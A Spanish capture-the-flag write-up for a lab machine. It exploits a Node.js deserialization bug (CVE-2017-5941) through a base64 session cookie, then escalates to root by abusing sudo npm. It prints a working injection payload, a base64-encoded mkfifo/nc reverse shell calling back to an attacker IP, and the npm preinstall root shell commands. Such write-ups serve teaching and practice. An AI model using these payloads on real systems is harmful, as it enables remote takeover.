PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Visitamos la web y encontramos un input donde nos piden que escribamos nuestro email para que nos manden algo

-Cualquier cosa que escribamos se refleja en la página, podría ser una XSS Injection, sin embargo no va por ahí la máquina

-Vamos a analizar como se está tramitando la petición utilizando BurpSuite

-Vemos en la respuesta del servidor que se le está pasando la siguiente cookie codificada en base64:
	Set-Cookie: session=eyJlbWFpbCI6ImhvbGEifQ== ;

-La decodificamos y nos devuelve el siguiente valor:
	echo 'eyJlbWFpbCI6ImhvbGEifQ== ' | base64 -d
	{"email":"hola"}

-Con lo cual, lo que ponemos en el input de la web, se pasa al servidor en formato jason

-Buscamos en google: 'node.js jason exploit'. Encontramos un exploit con el 'CVE-2017-5941'. Lo vamos a hacer MANUAL basándonos en el siguiente artículo:
	https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

-Tenemos que pegar el Payload en el campo email que encontramos antes en formato Json.
Inyectamos el Payload que utiliza para inyectar comandos en el campo email, quedaría así:
	{"email":"ND_FUNC$_function (){require('child_process').exec('AQUI INYECTAMOS COMANDOS', function(error, stdout, stderr) {console.log(stdout) });\n }()"}

-Introducimos la reverse shell de mkfifo y hacemos un Base64 Encode de todo, después se lo pasamos a la cookie en Burpsuite y recibimos la conexión. El Payload quedaría así:

eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjkuMi4xNjUgMTIzNCA+L3RtcC9mJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7Y29uc29sZS5sb2coc3Rkb3V0KSB9KTtcbiB9KCkifQ==

## Escalada de Privilegios

-sudo -l:
	(ALL) NOPASSWD: /usr/bin/npm *

-Buscamos el binario es Gtfobins y lo tenemos:
	dylan@jason:/opt/webapp$ TF=$(mktemp -d)
	dylan@jason:/opt/webapp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
	dylan@jason:/opt/webapp$ sudo npm -C $TF --unsafe-perm i
	# whoami
     root

